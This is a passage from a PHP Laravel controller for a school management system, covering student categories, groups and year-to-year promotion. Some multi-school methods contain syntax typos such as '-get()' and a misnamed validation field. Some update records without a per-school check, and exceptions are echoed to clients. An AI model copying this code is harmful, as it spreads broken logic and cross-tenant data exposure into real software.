                return ApiBaseMethod::sendError('Validation Error.', $validator->errors());
            }
            return redirect()->back()
                ->withErrors($validator)
                ->withInput();
        }

        try {
            $student_type = new AramiscStudentCategory();
            $student_type->category_name = $request->category;
            $result = $student_type->save();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                if ($result) {
                    return ApiBaseMethod::sendResponse(null, 'Category been created successfully');
                } else {
                    return ApiBaseMethod::sendError('Something went wrong, please try again');
                }
            } else {
                if ($result) {
                    Toastr::success('Operation successful', 'Success');
                    return redirect()->back();
                } else {
                    Toastr::error('Operation Failed', 'Failed');
                    return redirect()->back();
                }
            }
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function saas_student_type_store(Request $request)
    {
        $input = $request->all();
        $validator = Validator::make($input, [
            'category' => 'required|unique:aramisc_student_categories,category_name|max:50',
            'school_' => 'required',
        ]);

        if ($validator->fails()) {
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendError('Validation Error.', $validator->errors());
            }
            return redirect()->back()
                ->withErrors($validator)
                ->withInput();
        }

        try {
            $student_type = new AramiscStudentCategory();
            $student_type->category_name = $request->category;
            $student_type->school_id = $request->school_id;
            $result = $student_type->save();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                if ($result) {
                    return ApiBaseMethod::sendResponse(null, 'Category been created successfully');
                } else {
                    return ApiBaseMethod::sendError('Something went wrong, please try again');
                }
            } else {
                if ($result) {
                    Toastr::success('Operation successful', 'Success');
                    return redirect()->back();
                } else {
                    Toastr::error('Operation Failed', 'Failed');
                    return redirect()->back();
                }
            }
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function student_type_edit(Request $request, $id)
    {

        try {
            $student_type = AramiscStudentCategory::find($id);
            $student_types = AramiscStudentCategory::get();
            return view('backEnd.studentInformation.student_category', compact('student_types', 'student_type'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function saas_student_type_edit(Request $request,$school_id, $id)
    {

        try {
            $student_type = AramiscStudentCategory::where('school_id',$school_id)->find($id);
            $student_types = AramiscStudentCategory::where('school_id',$school_id)->get();
            return view('backEnd.studentInformation.student_category', compact('student_types', 'student_type'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function student_type_update(Request $request)
    {
        $input = $request->all();
        $validator = Validator::make($input, [
            'category' => 'required|max:50|unique:aramisc_student_categories,category_name,' . $request->id,
        ]);

        if ($validator->fails()) {
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendError('Validation Error.', $validator->errors());
            }
            return redirect()->back()
                ->withErrors($validator)
                ->withInput();
        }

        try {
            $student_type = AramiscStudentCategory::find($request->id);
            $student_type->category_name = $request->category;
            $result = $student_type->save();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                if ($result) {
                    return ApiBaseMethod::sendResponse(null, 'Category been updated successfully');
                } else {
                    return ApiBaseMethod::sendError('Something went wrong, please try again');
                }
            } else {
                if ($result) {
                    Toastr::success('Operation successful', 'Success');
                    return redirect('student-category');
                } else {
                    Toastr::error('Operation Failed', 'Failed');
                    return redirect()->back();
                }
            }
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function saas_student_type_update(Request $request)
    {
        $input = $request->all();
        $validator = Validator::make($input, [
            'category' => 'required|max:50|unique:aramisc_student_categories,category_name,' . $request->id,
            'school_id' => 'required',
        ]);

        if ($validator->fails()) {
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendError('Validation Error.', $validator->errors());
            }
            return redirect()->back()
                ->withErrors($validator)
                ->withInput();
        }

        try {
            $student_type = AramiscStudentCategory::find($request->id);
            $student_type->category_name = $request->category;
            $student_type->school_id = $request->school_id;
            $result = $student_type->save();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                if ($result) {
                    return ApiBaseMethod::sendResponse(null, 'Category been updated successfully');
                } else {
                    return ApiBaseMethod::sendError('Something went wrong, please try again');
                }
            } else {
                if ($result) {
                    Toastr::success('Operation successful', 'Success');
                    return redirect('student-category');
                } else {
                    Toastr::error('Operation Failed', 'Failed');
                    return redirect()->back();
                }
            }
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function student_type_delete(Request $request, $id)
    {
        try {
            $id_key = 'student_category_id';

            $tables = tableList::getTableList($id_key,$id);

            try {
                $delete_query = AramiscStudentCategory::destroy($id);
                if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                    if ($delete_query) {
                        return ApiBaseMethod::sendResponse(null, 'Category has been deleted successfully');
                    } else {
                        return ApiBaseMethod::sendError('Something went wrong, please try again.');
                    }
                } else {
                    if ($delete_query) {
                        Toastr::success('Operation successful', 'Success');
                        return redirect()->back();
                    } else {
                        Toastr::error('Operation Failed', 'Failed');
                        return redirect()->back();
                    }
                }
            } catch (\Illuminate\Database\QueryException $e) {
                $msg = 'This data already used in  : ' . $tables . ' Please remove those data first';
                Toastr::error('This item already used', 'Failed');
                return redirect()->back();
            }
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function saas_student_type_delete(Request $request, $school_id, $id)
    {
        try {
            $id_key = 'student_category_id';

            $tables = tableList::getTableList($id_key,$id);

            try {
                $delete_query = AramiscStudentCategory::where('school_id',$school_id)->where('id',$id)->delete();
                if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                    if ($delete_query) {
                        return ApiBaseMethod::sendResponse(null, 'Category has been deleted successfully');
                    } else {
                        return ApiBaseMethod::sendError('Something went wrong, please try again.');
                    }
                } else {
                    if ($delete_query) {
                        Toastr::success('Operation successful', 'Success');
                        return redirect()->back();
                    } else {
                        Toastr::error('Operation Failed', 'Failed');
                        return redirect()->back();
                    }
                }
            } catch (\Illuminate\Database\QueryException $e) {
                $msg = 'This data already used in  : ' . $tables . ' Please remove those data first';
                Toastr::error('This item already used', 'Failed');
                return redirect()->back();
            }
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }

    public function student_group_index(Request $request)
    {

        try {
            $student_groups = AramiscStudentGroup::where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendResponse($student_groups, null);
            }

            return view('backEnd.studentInformation.student_group', compact('student_groups'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function saas_student_group_index(Request $request, $school_id)
    {

        try {
            $student_groups = AramiscStudentGroup::where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->where('school_id',$school_id)->get();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendResponse($student_groups, null);
            }

            return view('backEnd.studentInformation.student_group', compact('student_groups'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function student_group_store(Request $request)
    {
        $input = $request->all();
        $validator = Validator::make($input, [
            'group' => 'required|unique:aramisc_student_groups,group',
        ]);

        if ($validator->fails()) {
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendError('Validation Error.', $validator->errors());
            }
            return redirect()->back()
                ->withErrors($validator)
                ->withInput();
        }


        try {
            $student_group = new AramiscStudentGroup();
            $student_group->group = $request->group;
            $result = $student_group->save();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                if ($result) {
                    return ApiBaseMethod::sendResponse(null, 'Group been created successfully');
                } else {
                    return ApiBaseMethod::sendError('Something went wrong, please try again');
                }
            } else {
                if ($result) {
                    Toastr::success('Operation successful', 'Success');
                    return redirect()->back();
                } else {
                    Toastr::error('Operation Failed', 'Failed');
                    return redirect()->back();
                }
            }
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function saas_student_group_store(Request $request)
    {
        $input = $request->all();
        $validator = Validator::make($input, [
            'group' => 'required|unique:aramisc_student_groups,group',
            'school_id' => 'required',
        ]);

        if ($validator->fails()) {
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendError('Validation Error.', $validator->errors());
            }
            return redirect()->back()
                ->withErrors($validator)
                ->withInput();
        }


        try {
            $student_group = new AramiscStudentGroup();
            $student_group->group = $request->group;
            $student_group->school_id = $request->school_id;
            $result = $student_group->save();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                if ($result) {
                    return ApiBaseMethod::sendResponse(null, 'Group been created successfully');
                } else {
                    return ApiBaseMethod::sendError('Something went wrong, please try again');
                }
            } else {
                if ($result) {
                    Toastr::success('Operation successful', 'Success');
                    return redirect()->back();
                } else {
                    Toastr::error('Operation Failed', 'Failed');
                    return redirect()->back();
                }
            }
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function student_group_edit(Request $request, $id)
    {

        try {
            $student_group = AramiscStudentGroup::find($id);
            $student_groups = AramiscStudentGroup::where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data = [];
                $data['student_group'] = $student_group->toArray();
                $data['student_groups'] = $student_groups->toArray();
                return ApiBaseMethod::sendResponse($data, null);
            }
            return view('backEnd.studentInformation.student_group', compact('student_groups', 'student_group'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function saas_student_group_edit(Request $request, $school_id, $id)
    {

        try {
            $student_group = AramiscStudentGroup::where('school_id',$school_id)->find($id);
            $student_groups = AramiscStudentGroup::where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->where('school_id',$school_id)->get();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data = [];
                $data['student_group'] = $student_group->toArray();
                $data['student_groups'] = $student_groups->toArray();
                return ApiBaseMethod::sendResponse($data, null);
            }
            return view('backEnd.studentInformation.student_group', compact('student_groups', 'student_group'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function student_group_update(Request $request)
    {
        $input = $request->all();
        $validator = Validator::make($input, [
            'group' => 'required|unique:aramisc_student_groups,group,' . $request->id,
        ]);

        if ($validator->fails()) {
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendError('Validation Error.', $validator->errors());
            }
            return redirect()->back()
                ->withErrors($validator)
                ->withInput();
        }


        try {
            $student_group = AramiscStudentGroup::find($request->id);
            $student_group->group = $request->group;
            $result = $student_group->save();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                if ($result) {
                    return ApiBaseMethod::sendResponse(null, 'Group been updated successfully');
                } else {
                    return ApiBaseMethod::sendError('Something went wrong, please try again');
                }
            } else {
                if ($result) {
                    Toastr::success('Operation successful', 'Success');
                    return redirect('student-group');
                } else {
                    Toastr::error('Operation Failed', 'Failed');
                    return redirect()->back();
                }
            }
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function saas_student_group_update(Request $request)
    {
        $input = $request->all();
        $validator = Validator::make($input, [
            'group' => 'required|unique:aramisc_student_groups,group,' . $request->id,
            'student_id' => 'required',
        ]);

        if ($validator->fails()) {
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendError('Validation Error.', $validator->errors());
            }
            return redirect()->back()
                ->withErrors($validator)
                ->withInput();
        }


        try {
            $student_group = AramiscStudentGroup::find($request->id);
            $student_group->group = $request->group;
            $student_group->student_id = $request->student_id;
            $result = $student_group->save();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                if ($result) {
                    return ApiBaseMethod::sendResponse(null, 'Group been updated successfully');
                } else {
                    return ApiBaseMethod::sendError('Something went wrong, please try again');
                }
            } else {
                if ($result) {
                    Toastr::success('Operation successful', 'Success');
                    return redirect('student-group');
                } else {
                    Toastr::error('Operation Failed', 'Failed');
                    return redirect()->back();
                }
            }
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function student_group_delete(Request $request, $id)
    {

        try {
            $student_group = AramiscStudentGroup::destroy($id);

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                if ($student_group) {
                    return ApiBaseMethod::sendResponse(null, 'Group has been deleted successfully');
                } else {
                    return ApiBaseMethod::sendError('Something went wrong, please try again');
                }
            } else {
                if ($student_group == true) {
                    Toastr::success('Operation successful', 'Success');
                    return redirect()->back();
                } else {
                    Toastr::error('Operation Failed', 'Failed');
                    return redirect()->back();
                }
            }
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function saas_student_group_delete(Request $request,$school_id, $id)
    {

        try {
            $student_group = AramiscStudentGroup::where('school_id',$school_id)->where('id',$id)->delete();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                if ($student_group) {
                    return ApiBaseMethod::sendResponse(null, 'Group has been deleted successfully');
                } else {
                    return ApiBaseMethod::sendError('Something went wrong, please try again');
                }
            } else {
                if ($student_group == true) {
                    Toastr::success('Operation successful', 'Success');
                    return redirect()->back();
                } else {
                    Toastr::error('Operation Failed', 'Failed');
                    return redirect()->back();
                }
            }
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function studentPromote_index(Request $request)
    {
        try {
            $sessions = AramiscAcademicYear::where('active_status', 1)->get();
            $classes = AramiscClass::where('active_status', 1)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data = [];
                $data['sessions'] = $sessions->toArray();
                $data['classes'] = $classes->toArray();
                return ApiBaseMethod::sendResponse($data, null);
            }
            $exams = AramiscExamType::where('active_status', 1)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();
            return view('backEnd.studentInformation.student_promote', compact('sessions', 'classes', 'exams'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function saas_studentPromote_index(Request $request, $school_id)
    {
        try {
            $sessions = AramiscAcademicYear::where('active_status', 1)->where('school_id',$school_id)->get();
            $classes = AramiscClass::where('active_status', 1)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->where('school_id',$school_id)->get();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data = [];
                $data['sessions'] = $sessions->toArray();
                $data['classes'] = $classes->toArray();
                return ApiBaseMethod::sendResponse($data, null);
            }
            $exams = AramiscExamType::where('active_status', 1)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();
            return view('backEnd.studentInformation.student_promote', compact('sessions', 'classes', 'exams'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function studentPromote(Request $request)
    {
        try {
            $sessions = AramiscAcademicYear::where('active_status', 1)->get();
            $classes = AramiscClass::where('active_status', 1)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data = [];
                $data['sessions'] = $sessions->toArray();
                $data['classes'] = $classes->toArray();
                return ApiBaseMethod::sendResponse($data, null);
            }
            $exams = AramiscExamType::where('active_status', 1)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();
            return view('backEnd.studentInformation.student_promote', compact('sessions', 'classes', 'exams'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function saas_studentPromote(Request $request, $school_id)
    {
        try {
            $sessions = AramiscAcademicYear::where('active_status', 1)->where('school_id',$school_id)->get();
            $classes = AramiscClass::where('active_status', 1)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->where('school_id',$school_id)->get();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data = [];
                $data['sessions'] = $sessions->toArray();
                $data['classes'] = $classes->toArray();
                return ApiBaseMethod::sendResponse($data, null);
            }
            $exams = AramiscExamType::where('active_status', 1)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();
            return view('backEnd.studentInformation.student_promote', compact('sessions', 'classes', 'exams'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function studentCurrentSearch(Request $request)
    {
        $input = $request->all();
        $validator = Validator::make($input, [
            'current_session' => 'required',
            'current_class' => 'required',
            'section' => 'required',
            'result' => 'required',
            'exam' => 'required',
        ]);

        if ($validator->fails()) {
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendError('Validation Error.', $validator->errors());
            }
            return redirect()->back()
                ->withErrors($validator)
                ->withInput();
        }
        try {
            if ($request->result == 'P') {
                $students = AramiscGeneralSettings::make_merit_list($request->current_class, $request->section, $request->exam);
                if (@$students == 0) {
                    return redirect()->back()->with('message-danger', 'Your result is not found!');
                } else
                    $students['students'] = [];
                foreach ($students['allresult_data'] as $key => $value) {
                    $d = AramiscStudent::where('id', $value->student_id)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->first();

                    if ($d->count() != 0) {
                        array_push($students['students'], $d);
                    }
                }
            } else {
                $students = AramiscStudent::where('class_id', '=', $request->current_class)->where('session_id', '=', $request->current_session)->where('section_id', $request->section)->where('active_status', 1)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();
            }
            $current_session = $request->current_session;
            $current_class = $request->current_class;
            $sessions = AramiscAcademicYear::where('active_status', 1)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();

            $classes = AramiscClass::where('active_status', 1)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();
            $UpYear = AramiscAcademicYear::find($current_session);
            $Upsessions = AramiscAcademicYear::where('active_status', 1)->whereYear('created_at', '>', date('Y', strtotime($UpYear->year)) . ' 00:00:00')->get();
            $Upcls = AramiscClass::find($current_class);
            $Upclasses = AramiscClass::where('active_status', 1)->whereYear('created_at', '>', date('Y', strtotime($UpYear->year)) . ' 00:00:00')->get();
            if (@$students['allresult_data'] ? $students['allresult_data']->isEmpty() : empty($students)) {
                Toastr::error('No result found', 'Failed');
                return redirect('student-promote');
            }

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data = [];
                $data['sessions'] = $sessions->toArray();
                $data['classes'] = $classes->toArray();
                $data['students'] = $students->toArray();
                $data['current_session'] = $current_session;
                $data['current_class'] = $current_class;
                return ApiBaseMethod::sendResponse($data, null);
            }
            $exams = AramiscExamType::where('active_status', 1)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();
            return view('backEnd.studentInformation.student_promote', compact('exams', 'Upsessions', 'sessions', 'classes', 'students', 'current_session', 'current_class', 'Upclasses', 'Upcls', 'UpYear'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function saas_studentCurrentSearch(Request $request,$school_id)
    {
        $input = $request->all();
        $validator = Validator::make($input, [
            'current_session' => 'required',
            'current_class' => 'required',
            'section' => 'required',
            'result' => 'required',
            'exam' => 'required',
        ]);

        if ($validator->fails()) {
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendError('Validation Error.', $validator->errors());
            }
            return redirect()->back()
                ->withErrors($validator)
                ->withInput();
        }
        try {
            if ($request->result == 'P') {
                $students = AramiscGeneralSettings::make_merit_list($request->current_class, $request->section, $request->exam);
                if (@$students == 0) {

                    return redirect()->back()->with('message-danger', 'Your result is not found!');

                } else
                    $students['students'] = [];
                foreach ($students['allresult_data'] as $key => $value) {
                    $d = AramiscStudent::where('id', $value->student_id)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->where('school_id',$school_id)-first();

                    if ($d->count() != 0) {
                        array_push($students['students'], $d);
                    }
                }
            } else {
                $students = AramiscStudent::where('class_id', '=', $request->current_class)->where('session_id', '=', $request->current_session)->where('section_id', $request->section)->where('active_status', 1)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->where('school_id',$school_id)->get();
            }
            $current_session = $request->current_session;
            $current_class = $request->current_class;
            $sessions = AramiscAcademicYear::where('active_status', 1)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->where('school_id',$school_id)-get();

            $classes = AramiscClass::where('active_status', 1)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->where('school_id',$school_id)-get();
            $UpYear = AramiscAcademicYear::find($current_session);
            $Upsessions = AramiscAcademicYear::where('active_status', 1)->whereYear('created_at', '>', date('Y', strtotime($UpYear->year)) . ' 00:00:00')->get();
            $Upcls = AramiscClass::find($current_class);
            $Upclasses = AramiscClass::where('active_status', 1)->whereYear('created_at', '>', date('Y', strtotime($UpYear->year)) . ' 00:00:00')->get();
            if (@$students['allresult_data'] ? $students['allresult_data']->isEmpty() : empty($students)) {
                Toastr::error('No result found', 'Failed');
                return redirect('student-promote');
            }

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data = [];
                $data['sessions'] = $sessions->toArray();
                $data['classes'] = $classes->toArray();
                $data['students'] = $students->toArray();
                $data['current_session'] = $current_session;
                $data['current_class'] = $current_class;
                return ApiBaseMethod::sendResponse($data, null);
            }
            $exams = AramiscExamType::where('active_status', 1)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();
            return view('backEnd.studentInformation.student_promote', compact('exams', 'Upsessions', 'sessions', 'classes', 'students', 'current_session', 'current_class', 'Upclasses', 'Upcls', 'UpYear'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function view_academic_performance(Request $request, $id)
    {

        if (ApiBaseMethod::checkUrl($request->fullUrl())) {
            return ApiBaseMethod::sendResponse($id, null);
        }
        return $id;
    }
    public function studentPromote_store(Request $request)
    {
        try {
            $sessions = AramiscAcademicYear::where('active_status', 1)->get();
            $classes = AramiscClass::where('active_status', 1)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data = [];
                $data['sessions'] = $sessions->toArray();
                $data['classes'] = $classes->toArray();
                return ApiBaseMethod::sendResponse($data, null);
            }
            $exams = AramiscExamType::where('active_status', 1)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();
            return view('backEnd.studentInformation.student_promote', compact('sessions', 'classes', 'exams'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function saas_studentPromote_store(Request $request, $school_id)
    {
        try {
            $sessions = AramiscAcademicYear::where('active_status', 1)->where('school_id',$school_id)->get();
            $classes = AramiscClass::where('active_status', 1)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->where('school_id',$school_id)->get();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data = [];
                $data['sessions'] = $sessions->toArray();
                $data['classes'] = $classes->toArray();
                return ApiBaseMethod::sendResponse($data, null);
            }
            $exams = AramiscExamType::where('active_status', 1)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();
            return view('backEnd.studentInformation.student_promote', compact('sessions', 'classes', 'exams'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function studentPromoteStore(Request $request)
    {

        $input = $request->all();
        $validator = Validator::make($input, [
            'promote_session' => 'required',
            'promote_class' => 'required',
            'promote_section' => 'required',
        ]);

        if ($validator->fails()) {
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendError('Validation Error.', $validator->errors());
            }
            return redirect()->back()
                ->withErrors($validator)
                ->withInput();
        }




        try {
            $current_session = $request->current_session;
            $current_class = $request->current_class;
            $UpYear = AramiscAcademicYear::find($current_session);
            $exams = AramiscExamType::where('active_status', 1)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();
            $Upsessions = AramiscAcademicYear::where('active_status', 1)->whereYear('created_at', '>', date('Y', strtotime($UpYear->year)) . ' 00:00:00')->get();
            $sessions = AramiscAcademicYear::where('active_status', 1)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();
            $classes = AramiscClass::where('active_status', 1)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();
            $promot_year = AramiscAcademicYear::find($request->promote_session);

            if ($request->promote_class == "" || $request->promote_session == "") {
                $students = AramiscStudent::where('class_id', '=', $request->promote_class)->where('session_id', '=', $request->promote_session)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();

                Session::flash('message-danger', 'Something went wrong, please try again');

                if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                    $data = [];
                    $data['sessions'] = $sessions->toArray();
                    $data['classes'] = $classes->toArray();
                    $data['students'] = $students->toArray();
                    $data['current_session'] = $current_session;
                    $data['current_class'] = $current_class;
                    return ApiBaseMethod::sendResponse($data, null);
                }
                return view('backEnd.studentInformation.student_promote', compact('exams', 'Upsessions', 'sessions', 'classes', 'students', 'current_session', 'current_class'));
            } else {

                DB::beginTransaction();

                try {
                    $std_info = [];
                    foreach ($request->id as $student_id) {
                        $student_details = AramiscStudent::findOrfail($student_id);

                        $new_academic_year = AramiscAcademicYear::findOrfail($request->promote_session);

                        $old_section = AramiscSection::findOrfail($student_details->section_id);

                        $new_section = $request->promote_section;

                        if ($request->result[$student_id] == 'P') {
                            $merit_list = \App\AramiscTemporaryMeritlist::where(['student_id' => $student_id, 'class_id' => $request->current_class, 'section_id' => $student_details->section_id])->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->first();
                            $roll = $merit_list->merit_order;
                        } else {
                            $roll = null;
                            $merit_list = null;
                        }
                        $student_promote = new AramiscStudentPromotion();
                        $student_promote->student_id = $student_id;
                        $student_promote->previous_class_id = $request->current_class;
                        $student_promote->current_class_id = $request->promote_class;
                        $student_promote->previous_session_id = $request->current_session;
                        $student_promote->current_session_id = $request->promote_session;

                        $student_promote->previous_section_id = $student_details->section_id;
                        $student_promote->current_section_id = $new_section;

                        $student_promote->admission_number = $student_details->admission_no;
                        $student_promote->student_info = $student_details->toJson();
                        $student_promote->merit_student_info = ($merit_list != null ? $merit_list->toJson() : $student_details->toJson());

                        $student_promote->previous_roll_number = $student_details->roll_no;
                        $student_promote->current_roll_number = $roll;

                        $student_promote->result_status = $request->result[$student_id];
                        $student_promote->save();

                        $student = AramiscStudent::find($student_id);
                        $student->class_id = $request->promote_class;
                        $student->session_id = $request->promote_session;
                        $student->section_id = $new_section;
                        $student->roll_no = $roll;
                        $student->created_at = $promot_year->starting_date . ' 12:00:00';
                        $student->save();
                    }


                    DB::commit();

                    $students = AramiscStudent::where('class_id', '=', $request->promote_class)->where('session_id', '=', $request->promote_session)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();

                    if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                        return ApiBaseMethod::sendResponse(null, 'Student has been promoted successfully');
                    }
                    Toastr::success('Operation successful', 'Success');
                    return redirect('student-promote');
                } catch (\Exception $e) {
                    DB::rollback();
                    $students = AramiscStudent::where('class_id', '=', $request->current_class)->where('session_id', '=', $request->current_session)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();

                    Session::flash('message-danger-table', 'Something went wrong, please try again');

                    if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                        $data = [];
                        $data['sessions'] = $sessions->toArray();
                        $data['classes'] = $classes->toArray();
                        $data['students'] = $students->toArray();
                        $data['current_session'] = $current_session;
                        $data['current_class'] = $current_class;
                        return ApiBaseMethod::sendResponse($data, 'Something went wrong, please try again');
                    }
                    Toastr::error('Operation Failed', 'Failed');
                    return view('backEnd.studentInformation.student_promote', compact('exams', 'Upsessions', 'sessions', 'classes', 'students', 'current_session', 'current_class'));
                }
            }
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }

    public function disabledStudent(Request $request)
    {
        try {
            $students = AramiscStudent::where('active_status', 0)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();
            $classes = AramiscClass::where('active_status', 1)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data = [];
                $data['students'] = $students->toArray();
                $data['classes'] = $classes->toArray();
                return ApiBaseMethod::sendResponse($data, null);
            }
